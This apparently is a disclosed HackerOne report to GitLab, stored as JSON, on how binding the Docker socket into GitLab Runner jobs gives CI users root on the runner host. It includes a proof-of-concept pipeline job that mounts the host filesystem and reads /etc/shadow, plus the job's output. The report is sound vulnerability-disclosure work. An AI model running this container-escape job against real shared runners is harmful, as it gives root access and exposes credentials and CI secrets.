{
  "id": 1417211,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDE3MjEx",
  "url": "https://hackerone.com/reports/1417211",
  "title": "Installing Gitlab runner with Docker-In-Docker allows root access",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2021-12-05T16:06:44.068Z",
  "submitted_at": "2021-12-05T16:06:44.086Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jafarakhondali",
    "url": "/jafarakhondali",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-02-10T09:13:05.182Z",
  "bug_reporter_agreed_on_going_public_at": "2022-01-25T10:06:15.330Z",
  "team_member_agreed_on_going_public_at": "2022-02-10T09:13:05.039Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary\n\nInstalling a Gitlab runner using official documents: https://docs.gitlab.com/ee/ci/docker/using_docker_build.html#use-docker-socket-binding\nallows any user with access to Gitlab CI to have root access on Gitlab Runner server.\n\n### Steps to reproduce\nInstall Gitlab-runner binary using official documents and run Docker-in-Docker:\n```\nsudo gitlab-runner register -n \\\n  --url https://gitlab.com/ \\\n  --registration-token REGISTRATION_TOKEN \\\n  --executor docker \\\n  --description \"My Docker Runner\" \\\n  --docker-image \"docker:19.03.12\" \\\n  --docker-volumes /var/run/docker.sock:/var/run/docker.sock\n```  \nThen set \"exploiter\" tag for runner, and in a project that have access to this runner, enter following pipeline:\n```\nstages:\n  - exploiter\nexploiter:\n    stage: exploiter\n    when: manual\n    tags:\n      - exploiter\n    script:\n      - docker run --rm  --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c \"cat /host/etc/shadow\"\n```\nand run the job.\n\n### Impact\nAllows root access on Gitlab-runner server\n\n### What is the current *bug* behavior?\nSample output of job allows reading /etc/shadow of server.\n```\nRunning with gitlab-runner 14.5.1 (de104fcd)\n  on My Docker Runner 4j_ZSXte\nPreparing the \"docker\" executor 00:04\nUsing Docker executor with image docker:19.03.12 ...\nPulling docker image docker:19.03.12 ...\nUsing docker image sha256:81f5749c9058a7284e6acd8e126f2b882765a17b9ead14422b51cde1a110b85c for docker:19.03.12 with digest docker@sha256:d41efe7ad0df5a709cfd4e627c7e45104f39bbc08b1b40d7fb718c562b3ce135 ...\nPreparing environment 00:02\nRunning on runner-4jzsxte-project-28249719-concurrent-0 via ubuntu-g1-1-1-25-su-1...\nGetting source from Git repository 00:03\nFetching changes with git depth set to 50...\nReinitialized existing Git repository in /builds/foroozan2/barika/.git/\nChecking out e64249e2 as main...\nSkipping Git submodules setup\nExecuting \"step_script\" stage of the job script 00:10\nUsing docker image sha256:81f5749c9058a7284e6acd8e126f2b882765a17b9ead14422b51cde1a110b85c for docker:19.03.12 with digest docker@sha256:d41efe7ad0df5a709cfd4e627c7e45104f39bbc08b1b40d7fb718c562b3ce135 ...\n$ docker run --rm --privileged --net=host --pid=host --ipc=host --volume /:/host ubuntu bash -c \"cat /host/etc/shadow\"\nUnable to find image 'ubuntu:latest' locally\nlatest: Pulling from library/ubuntu\n7b1a6ab2e44d: Pulling fs layer\n7b1a6ab2e44d: Verifying Checksum\n7b1a6ab2e44d: Download complete\n7b1a6ab2e44d: Pull complete\nDigest: sha256:626ffe58f6e7566e00254b638eb7e0f3b11d4da9675088f4781a50ae288f3322\nStatus: Downloaded newer image for ubuntu:latest\nroot:*:18438:0:99999:7:::\ndaemon:*:18438:0:99999:7:::\nbin:*:18438:0:99999:7:::\nsys:*:18438:0:99999:7:::\nsync:*:18438:0:99999:7:::\ngames:*:18438:0:99999:7:::\nman:*:18438:0:99999:7:::\nlp:*:18438:0:99999:7:::\nmail:*:18438:0:99999:7:::\nnews:*:18438:0:99999:7:::\nuucp:*:18438:0:99999:7:::\nproxy:*:18438:0:99999:7:::\nwww-data:*:18438:0:99999:7:::\nbackup:*:18438:0:99999:7:::\nlist:*:18438:0:99999:7:::\nirc:*:18438:0:99999:7:::\ngnats:*:18438:0:99999:7:::\nnobody:*:18438:0:99999:7:::\nsystemd-network:*:18438:0:99999:7:::\nsystemd-resolve:*:18438:0:99999:7:::\nsystemd-timesync:*:18438:0:99999:7:::\nmessagebus:*:18438:0:99999:7:::\nsyslog:*:18438:0:99999:7:::\n_apt:*:18438:0:99999:7:::\ntss:*:18438:0:99999:7:::\nuuidd:*:18438:0:99999:7:::\ntcpdump:*:18438:0:99999:7:::\nsshd:*:18438:0:99999:7:::\nlandscape:*:18438:0:99999:7:::\npollinate:*:18438:0:99999:7:::\nsystemd-coredump:!!:18966::::::\nubuntu:!:18966:0:99999:7:::\nlxd:!:18966::::::\ngitlab-runner:!:18966:0:99999:7:::\n```\n\n### What is the expected *correct* behavior?\n\nAlthough this issue may be known to Gitlab team, there is no security warning in documents for not binding docker socket, or at least use it only on trusted servers. Currently I'm encountering many clients that were not aware of this security issue and were thinking they've provided isolation in their teams. Such issue allows a remote attacker to malform CI process and have access to sensitive data.\nGitlab documents should inform users for such vulnerability and provide documents on alternative-safe methods to use Dind such as rootless docker.\n\n## Impact\n\nAn attacker can have access to projects and their sensitive data running in Gitlab-CI by having root access of Gitlab server. Many projects store credentials in their CI process, allowing the Gitlab runner to have access to their production environment.",
  "bounty_amount": "100.0",
  "formatted_bounty": "$100",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 9,
  "voters": [
    "thruster",
    "h4x0r_dz",
    "damienhunter9",
    "trust-in-god",
    "4st1nus",
    "spoopytim",
    "krshan",
    "xclow4n",
    "omarmo770"
  ],
  "structured_scope": {
    "databaseId": 55899,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://gitlab.com/gitlab-org/gitlab-runner",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
